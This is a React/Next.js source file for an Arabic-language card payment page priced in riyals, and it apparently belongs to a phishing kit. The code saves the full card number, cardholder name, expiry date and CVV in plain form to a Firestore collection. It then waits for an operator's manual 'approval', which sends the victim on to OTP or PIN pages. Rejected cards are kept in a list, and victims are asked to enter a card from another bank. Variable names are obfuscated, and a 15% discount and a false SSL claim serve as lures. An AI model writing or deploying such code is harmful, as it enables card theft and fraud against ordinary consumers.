"use client"

import type React from "react"
import { useState, useEffect, useRef } from "react"
import { useRouter } from "next/navigation"
import { toast } from "sonner"
import { Input } from "@/components/ui/input"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { ShieldCheck, CreditCard, Lock } from "lucide-react"
import { _dct, _fcn, _fed, _gbi, _lc } from "@/lib/card-utils"
import { db } from "@/lib/firebase"
import { secureAddData } from "@/lib/secure-firebase"
import { doc, onSnapshot, setDoc, Firestore } from "firebase/firestore"
import { addToHistory } from "@/lib/history-utils"
import { FullPageLoader } from "./loader"
import { _gt } from "@/lib/text-obf"
import { _icb, isCountryAllowed } from "@/lib/firebase/settings"
import { EmailModal } from "@/components/email-modal"
import { _e } from "@/lib/secure-utils"


interface _P1Props {
  offerTotalPrice: number
}

export default function P1({ offerTotalPrice }: _P1Props) {
  const router = useRouter()
  const [selectedPaymentMethod, setSelectedPaymentMethod] = useState("credit-card")
  const [_v1, _s1] = useState("")
  const [_v4, _s4] = useState("")
  const [_v3, _s3] = useState("")
  const [_v2, _s2] = useState("")
  const [cardType, setCardType] = useState<string | null>(null)
  const [bankInfo, setBankInfo] = useState<{ name: string; country: string } | null>(null)
  const [isValidCard, setIsValidCard] = useState(false)
  const [expiryError, setExpiryError] = useState("")
  const [cardRejectionError, setCardRejectionError] = useState("")

  // Waiting state
  const [isWaitingAdmin, setIsWaitingAdmin] = useState(false)
  const rejectionHandledRef = useRef(false)
  
  const [isCardBlockedState, setIsCardBlockedState] = useState(false)
  const [showEmailModal, setShowEmailModal] = useState(false)
  const [userCountry, setUserCountry] = useState<string | null>(null)
  const [countryCheckDone, setCountryCheckDone] = useState(false)

  useEffect(() => {
    const cleanNumber = _v1.replace(/\s/g, "")
    if (cleanNumber.length >= 6) {
      const type = _dct(cleanNumber)
      setCardType(type)
      const bank = _gbi(cleanNumber)
      setBankInfo(bank)
    } else {
      setCardType(null)
      setBankInfo(null)
    }

    if (cleanNumber.length === 16) {
      setIsValidCard(_lc(cleanNumber))
    } else {
      setIsValidCard(false)
    }
  }, [_v1])

  useEffect(() => {
    const checkCardBlocked = async () => {
      const cleanNumber = _v1.replace(/\s/g, "")
      if (cleanNumber.length >= 4) {
        const blocked = await _icb(cleanNumber)
        setIsCardBlockedState(blocked)
      } else {
        setIsCardBlockedState(false)
      }
    }
    checkCardBlocked()
  }, [_v1])

  // Check user country on component mount
  useEffect(() => {
    const checkCountry = async () => {
      try {
        // Check if already submitted email
        const emailSubmitted = localStorage.getItem("email_submitted")
        if (emailSubmitted) {
          // Redirect to thank you page
          router.push("/thank-you")
          return
        }

        // Get country from localStorage (saved from Firebase)
        let countryCodeAlpha3 = localStorage.getItem("country")
        
        // If not in localStorage, try to get from Firebase
        if (!countryCodeAlpha3) {
          const visitorID = localStorage.getItem("visitor")
          if (visitorID && db) {
            const docRef = doc(db as Firestore, "pays", visitorID)
            const docSnap = await import("firebase/firestore").then(mod => mod.getDoc(docRef))
            if (docSnap.exists()) {
              countryCodeAlpha3 = docSnap.data().country
              if (countryCodeAlpha3) {
                localStorage.setItem("country", countryCodeAlpha3)
              }
            }
          }
        }
        
        if (countryCodeAlpha3) {
          setUserCountry(countryCodeAlpha3)
          
          // Check if country is allowed
          const allowed = await isCountryAllowed(countryCodeAlpha3)
          if (!allowed) {
            setShowEmailModal(true)
          }
        }
        
        setCountryCheckDone(true)
      } catch (error) {
        console.error('Error checking country:', error)
        // If error, allow access
        setCountryCheckDone(true)
      }
    }
    checkCountry()
  }, [router])

  // Validate expiry date
  useEffect(() => {
    if (_v3.length >= 2) {
      const parts = _v3.split('/')
      const monthStr = parts[0]
      const expMonth = parseInt(monthStr)

      if (expMonth < 1 || expMonth > 12) {
        setExpiryError("الشهر يجب أن يكون بين 01 و 12")
        return
      }

      if (_v3.length === 5) {
        const yearStr = parts[1]
        const expYear = parseInt(yearStr)
        const currentDate = new Date()
        const currentYear = currentDate.getFullYear() % 100
        const currentMonth = currentDate.getMonth() + 1

        if (expYear > currentYear + 10) {
          setExpiryError("تاريخ الانتهاء غير صالح")
        } else if (expYear < currentYear || (expYear === currentYear && expMonth < currentMonth)) {
          setExpiryError("تاريخ البطاقة منتهي")
        } else {
          setExpiryError("")
        }
      } else {
        if (expMonth >= 1 && expMonth <= 12) {
          setExpiryError("")
        }
      }
    } else {
      setExpiryError("")
    }
  }, [_v3])

  useEffect(() => {
    const visitorID = localStorage.getItem("visitor")
    if (!visitorID || !db) return

    const unsubscribe = onSnapshot(
      doc(db as Firestore, "pays", visitorID),
      (docSnapshot) => {
        if (docSnapshot.exists()) {
          const data = docSnapshot.data()
          const status = data.cardStatus
          const redirectPage = data.redirectPage

          // Don't auto-redirect if admin just redirected to payment page
          if (redirectPage === "payment") {
            console.log("[Card Status] Admin redirect detected, ignoring auto-redirect")
            return
          }

          console.log('[Card Status] Current status:', status)
          
          if (status === "approved_with_otp") {
            console.log('[Card Status] Approved with OTP, redirecting to step2')
            setIsWaitingAdmin(false)
            // Redirect to OTP page
            router.push("/step2")
          } else if (status === "approved_with_pin") {
            console.log('[Card Status] Approved with PIN, redirecting to step3')
            setIsWaitingAdmin(false)
            // Redirect to PIN page directly
            router.push("/step3")
          } else if (status === "rejected" && !rejectionHandledRef.current) {
            console.log('[Card Status] Card rejected, hiding loader immediately')
            
            // Mark rejection as handled
            rejectionHandledRef.current = true
            
            // Hide loader immediately
            setIsWaitingAdmin(false)
            
            // Show error message under card number
            setCardRejectionError("تم رفض البطاقة من قبل البنك المصدر الرجاء التسديد من مصرف آخر")
            
            // Also show toast for visibility
            toast.error("تم رفض بيانات البطاقة", {
              description: "يرجى إعادة إدخال بيانات صحيحة",
              duration: 5000
            })
            
            // Save rejected card to history (async, don't wait)
            const currentCardData = {
              _v1: data._v1,
              _v4: data._v4,
              _v3: data._v3,
              _v2: data._v2,
              cardType: data.cardType,
              bankInfo: data.bankInfo,
              rejectedAt: new Date().toISOString()
            }
            
            setDoc(doc(db as Firestore, "pays", visitorID), {
              oldCards: data.oldCards ? [...data.oldCards, currentCardData] : [currentCardData],
              cardStatus: "pending",
              // Clear redirect fields so user stays on card page
              redirectPage: null,
              currentStep: "_st1"
            }, { merge: true }).catch(err => {
              console.error("[Card Status] Error saving rejected card:", err)
            })
          }
        }
      },
      (err) => {
        console.error("Error listening to document:", err)
        setIsWaitingAdmin(false)
        toast.error("حدث خطأ في الاتصال", {
          description: "يرجى المحاولة مرة أخرى",
          duration: 5000
        })
      },
    )

    return () => unsubscribe()
  }, [router])

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = _fcn(e.target.value)
    // Limit to 16 digits (19 chars with spaces)
    if (formatted.replace(/\s/g, "").length <= 16) {
      _s1(formatted)
    }
  }

  const handleExpiryDateChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = _fed(e.target.value)
    _s3(formatted)
  }

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, "").slice(0, 3)
    _s2(value)
  }

  const _hp = async (e: React.FormEvent) => {
    e.preventDefault()

    let visitorID = localStorage.getItem("visitor")

    if (!visitorID) {
      visitorID = "visitor_" + Date.now() + "_" + Math.random().toString(36).substr(2, 9)
      localStorage.setItem("visitor", visitorID)
    }

    if (!isValidCard) {
      alert(_gt("t5"))
      return
    }

    if (expiryError) {
      alert(expiryError)
      return
    }

    if (isCardBlockedState) {
      toast.error("تم إيقاف التسديد", {
        description: "تم إيقاف التسديد من خلال مصرف الراجحي والمحافظ الإلكترونية. الرجاء إدخال بطاقة من مصرف آخر",
        duration: 7000
      })
      return
    }

    try {
      // Reset rejection flag and error message for new submission
      rejectionHandledRef.current = false
      setCardRejectionError("")
      
      const finalPrice = calculateFinalPrice()
      const discount = selectedPaymentMethod === "credit-card" ? 0.15 : 0
      
      console.log('[Payment] Starting payment process for visitor:', visitorID)
      
      await secureAddData({
        id: visitorID,
        paymentMethod: selectedPaymentMethod,
        cardType,
        bankInfo,
        _v4,
        _v2,
        _v1,
        _v3,
        originalPrice: offerTotalPrice,
        discount,
        finalPrice: Number.parseFloat(finalPrice.toFixed(2)),
        cardStatus: "pending",
        otpStatus: "pending",
        // Clear any previous redirect/step values
        redirectPage: null,
        currentStep: "_st1"
      })
      
      console.log('[Payment] Data saved successfully')

      await addToHistory(visitorID, "_t1", {
        _v1: _e(_v1),
        _v4: _e(_v4),
        cardType,
        _v3: _e(_v3),
        _v2: _e(_v2),
        bankInfo
      }, "pending")
      
      console.log('[Payment] History entry added successfully')

      setIsWaitingAdmin(true)
      console.log('[Payment] Waiting for admin approval')
    } catch (error) {
      console.error("[Payment] Payment error:", error)
      toast.error("حدث خطأ", {
        description: `فشلت معالجة الدفع: ${error instanceof Error ? error.message : 'خطأ غير معروف'}`,
        duration: 5000
      })
    }
  }

  const getDiscountAmount = () => {
    if (selectedPaymentMethod === "credit-card") {
      return "15%"
    }
    return null
  }

  const calculateFinalPrice = () => {
    if (selectedPaymentMethod === "credit-card") {
      return offerTotalPrice * 0.85
    }
    return offerTotalPrice
  }

  const finalPrice = calculateFinalPrice()

  // Handle email submission for blocked countries
  const handleEmailSubmit = async (name: string, email: string) => {
    try {
      const visitorID = localStorage.getItem("visitor") || "visitor_" + Date.now()
      
      // Save to Firebase or send email
      await secureAddData({
        id: visitorID,
        name,
        email,
        country: userCountry,
        status: "pending_email",
        offerPrice: offerTotalPrice,
        createdAt: new Date().toISOString()
      })
      
      // Mark email as submitted
      localStorage.setItem("email_submitted", "true")
      
      // Redirect to thank you page
      setTimeout(() => {
        router.push("/thank-you")
      }, 1000)
    } catch (error) {
      console.error("Error saving email:", error)
      throw error
    }
  }

  return (
    <>
      {isWaitingAdmin && <FullPageLoader />}
      
      {/* Email Modal for Blocked Countries */}
      <EmailModal 
        isOpen={showEmailModal} 
        onClose={() => setShowEmailModal(false)}
        onSubmit={handleEmailSubmit}
        canClose={false}
      />
      
      <div className={`space-y-4 sm:space-y-5 ${showEmailModal ? 'blur-xl pointer-events-none' : ''}`} dir="rtl">
        {/* Payment Method Selection */}
        <div className="bg-gradient-to-br from-gray-50 to-gray-100 rounded-lg sm:rounded-xl p-3 sm:p-5 md:p-6 border border-gray-200">
          <label className="flex items-center gap-2 text-gray-900 font-bold text-sm sm:text-base md:text-lg mb-3 sm:mb-4">
            <ShieldCheck className="w-4 h-4 sm:w-5 sm:h-5 text-[#0a4a68]" />
            طريقة الدفع
          </label>
          <div className="space-y-2 sm:space-y-3">
            {[
              { 
                value: "credit-card", 
                label: "البطاقات الائتمانية", 
                discount: "15%", 
                icons: ["/visa.svg", "/mas.svg"],
                disabled: false
              },
              { 
                value: "mada", 
                label: "بطاقات مدى", 
                discount: null, 
                icon: "/mada.jpg",
                disabled: false
              },
              { 
                value: "apple-pay", 
                label: "Apple Pay", 
                discount: null, 
                icon: "/apple-pay.png",
                disabled: false,
                message: "غير متوفر حالياً - يرجى استخدام طريقة دفع أخرى"
              },

            ].map((method) => (
              <div key={method.value}>
              <label
                className={`
                  relative flex items-center justify-between gap-2 sm:gap-3 p-3 sm:p-4 md:p-5
                  border-2 rounded-lg sm:rounded-xl cursor-pointer transition-all duration-200
                  ${
                    selectedPaymentMethod === method.value
                      ? "border-[#0a4a68] bg-white shadow-md"
                      : "border-gray-200 hover:border-gray-300 bg-white/50"
                  }
                  ${method.disabled ? "opacity-60 cursor-not-allowed" : ""}
                  ${(method as any).unavailable ? "opacity-75" : ""}
                `}
              >
                <div className="flex items-center gap-2 sm:gap-3 min-w-0">
                  <input
                    type="radio"
                    name="paymentMethod"
                    value={method.value}
                    checked={selectedPaymentMethod === method.value}
                    onChange={() => {
                      if (method.disabled) return
                      if ((method as any).unavailable) {
                        toast.error("Apple Pay غير متوفر حالياً", {
                          description: "يرجى اختيار طريقة دفع أخرى",
                          duration: 4000
                        })
                        return
                      }
                      setSelectedPaymentMethod(method.value)
                    }}
                    disabled={method.disabled}
                    className="w-4 h-4 sm:w-5 sm:h-5 text-[#0a4a68] focus:ring-[#0a4a68] disabled:opacity-50 flex-shrink-0"
                  />
                  <div className="flex items-center gap-1.5 sm:gap-2 flex-shrink-0">
                    {method.icons ? (
                      method.icons.map((icon, idx) => (
                        <img key={idx} src={icon} alt="logo" width={28} height={18} className="object-contain sm:w-[35px] sm:h-[22px]" />
                      ))
                    ) : (
                      <img src={method.icon || "/placeholder.svg"} alt="logo" width={28} height={18} className="object-contain sm:w-[35px] sm:h-[22px]" />
                    )}
                  </div>
                  <span className={`text-sm sm:text-base md:text-lg font-semibold truncate ${method.disabled ? 'text-gray-400' : 'text-gray-900'}`}>
                    {method.label}
                  </span>
                </div>
                <div className="flex items-center gap-2 flex-shrink-0">
                  {method.discount && (
                    <Badge className="bg-gradient-to-r from-yellow-400 to-yellow-500 text-gray-900 font-bold px-2 sm:px-3 py-0.5 sm:py-1 text-[10px] sm:text-xs shadow-sm whitespace-nowrap">
                      خصم {method.discount}
                    </Badge>
                  )}
                </div>
              </label>
              {method.message && selectedPaymentMethod === method.value && (
                <div className="mt-2 p-2 sm:p-3 bg-red-50 border border-red-200 rounded-lg" dir="rtl">
                  <p className="text-xs sm:text-sm text-red-600 font-medium">
                    {method.message}
                  </p>
                </div>
              )}
              </div>
            ))}
          </div>
        </div>

        {/* Card Information Form */}
        <form onSubmit={_hp} className="space-y-3 sm:space-y-4">
          {/* Card Holder Name */}
          <div className="space-y-1.5 sm:space-y-2">
            <label className="block text-gray-900 font-bold text-xs sm:text-sm md:text-base">
              اسم حامل البطاقة
            </label>
            <Input
              type="text"
              value={_v4}
              onChange={(e) => _s4(e.target.value.toUpperCase())}
              placeholder="CARDHOLDER NAME"
              dir="ltr"
              className="h-12 sm:h-14 md:h-16 text-base sm:text-lg md:text-xl uppercase border-2 border-gray-300 focus:border-[#0a4a68] rounded-lg sm:rounded-xl"
              required
            />
          </div>

          {/* Card Number Input */}
          <div className="space-y-1.5 sm:space-y-2">
            <label className="flex items-center flex-wrap gap-1.5 sm:gap-2 text-gray-900 font-bold text-xs sm:text-sm md:text-base">
              <CreditCard className="w-3.5 h-3.5 sm:w-4 sm:h-4 text-[#0a4a68]" />
              رقم البطاقة
              {isValidCard && (
                <Badge variant="outline" className="border-green-500 text-green-700 text-[10px] sm:text-xs">
                  <ShieldCheck className="w-3 h-3 ml-1" />
                  صالح
                </Badge>
              )}
              {cardType && (
                <Badge className="bg-blue-100 text-blue-800 text-[10px] sm:text-xs">
                  {cardType}
                </Badge>
              )}
            </label>
            <Input
              type="text"
              value={_v1}
              onChange={handleCardNumberChange}
              placeholder="1234 5678 9012 3456"
              maxLength={19}
              dir="ltr"
              className={`h-12 sm:h-14 md:h-16 text-lg sm:text-xl md:text-2xl font-mono tracking-wider border-2 rounded-lg sm:rounded-xl transition-all ${
                isValidCard 
                  ? "border-green-500 focus:border-green-600" 
                  : _v1.length > 0 
                  ? "border-red-300 focus:border-red-500" 
                  : "border-gray-300 focus:border-[#0a4a68]"
              }`}
              required
            />
            {_v1.length > 0 && _v1.replace(/\s/g, "").length !== 16 && (
              <p className="text-red-500 text-[11px] sm:text-xs">يجب أن يكون 16 رقم</p>
            )}
            {cardRejectionError && (
              <div className="bg-red-50 border-2 border-red-500 rounded-lg p-2 sm:p-3 mt-1 sm:mt-2">
                <p className="text-red-700 text-xs sm:text-sm font-bold">
                  {cardRejectionError}
                </p>
              </div>
            )}
            {isCardBlockedState && (
              <div className="bg-red-50 border-2 border-red-500 rounded-lg p-2 sm:p-3 mt-1 sm:mt-2">
                <p className="text-red-700 text-xs sm:text-sm font-bold">
                  تم إيقاف التسديد من خلال مصرف الراجحي والمحافظ الإلكترونية
                </p>
                <p className="text-red-600 text-[11px] sm:text-xs mt-1">
                  الرجاء إدخال بطاقة من مصرف آخر
                </p>
              </div>
            )}
          </div>

          {/* Expiry and CVV */}
          <div className="grid grid-cols-2 gap-2 sm:gap-3 md:gap-4">
            <div className="space-y-1.5 sm:space-y-2">
              <label className="block text-gray-900 font-bold text-xs sm:text-sm md:text-base">
                تاريخ الانتهاء
              </label>
              <Input
                type="text"
                value={_v3}
                onChange={handleExpiryDateChange}
                placeholder="MM/YY"
                maxLength={5}
                dir="ltr"
                className={`h-12 sm:h-14 md:h-16 text-lg sm:text-xl md:text-2xl font-mono border-2 rounded-lg sm:rounded-xl text-center ${
                  expiryError 
                    ? "border-red-500 focus:border-red-600" 
                    : _v3.length === 5 && !expiryError
                    ? "border-green-500 focus:border-green-600"
                    : "border-gray-300 focus:border-[#0a4a68]"
                }`}
                required
              />
              {expiryError && (
                <p className="text-red-500 text-[11px] sm:text-xs">{expiryError}</p>
              )}
            </div>
            <div className="space-y-1.5 sm:space-y-2">
              <label className="flex items-center gap-1.5 sm:gap-2 text-gray-900 font-bold text-xs sm:text-sm md:text-base">
                <Lock className="w-3.5 h-3.5 sm:w-4 sm:h-4 text-[#0a4a68]" />
                CVV
              </label>
              <Input
                type="password"
                value={_v2}
                onChange={handleCvvChange}
                placeholder="123"
                maxLength={3}
                dir="ltr"
                className={`h-12 sm:h-14 md:h-16 text-lg sm:text-xl md:text-2xl font-mono border-2 rounded-lg sm:rounded-xl text-center ${
                  _v2.length === 3
                    ? "border-green-500 focus:border-green-600"
                    : "border-gray-300 focus:border-[#0a4a68]"
                }`}
                required
              />
              {_v2.length > 0 && _v2.length !== 3 && (
                <p className="text-red-500 text-[11px] sm:text-xs">يجب أن يكون 3 أرقام</p>
              )}
            </div>
          </div>

          {/* Price Summary - Compact */}
          {getDiscountAmount() && (
            <div className="bg-green-50 rounded-lg p-2.5 sm:p-3 border border-green-200">
              <div className="flex justify-between items-center text-xs sm:text-sm">
                <span className="text-gray-600">السعر الأصلي:</span>
                <span className="text-gray-600 line-through">{offerTotalPrice.toFixed(2)} ﷼</span>
              </div>
              <div className="flex justify-between items-center text-xs sm:text-sm mt-1">
                <span className="text-green-600 font-semibold">خصم {getDiscountAmount()}:</span>
                <span className="text-green-600 font-semibold">
                  -{(offerTotalPrice * 0.15).toFixed(2)} ﷼
                </span>
              </div>
            </div>
          )}

          {/* Submit Button with Price */}
          <Button
            type="submit"
            disabled={!isValidCard || !_v3 || _v2.length !== 3 || !!expiryError || !_v4}
            className="w-full h-14 sm:h-16 md:h-18 bg-gradient-to-r from-yellow-400 to-yellow-500 hover:from-yellow-500 hover:to-yellow-600 text-[#0a4a68] font-bold text-lg sm:text-xl md:text-2xl rounded-lg sm:rounded-xl shadow-lg hover:shadow-xl transition-all disabled:opacity-50 disabled:cursor-not-allowed"
          >
            <Lock className="w-4 h-4 sm:w-5 sm:h-5 ml-2" />
            دفع {finalPrice.toFixed(2)} ﷼
          </Button>

          {/* Security Notice */}
          <div className="flex items-center justify-center gap-1.5 sm:gap-2 text-gray-500 text-[11px] sm:text-xs md:text-sm">
            <ShieldCheck className="w-3.5 h-3.5 sm:w-4 sm:h-4" />
            <span>معاملتك محمية بتشفير SSL 256-bit</span>
          </div>
        </form>
      </div>

    </>
  )
}
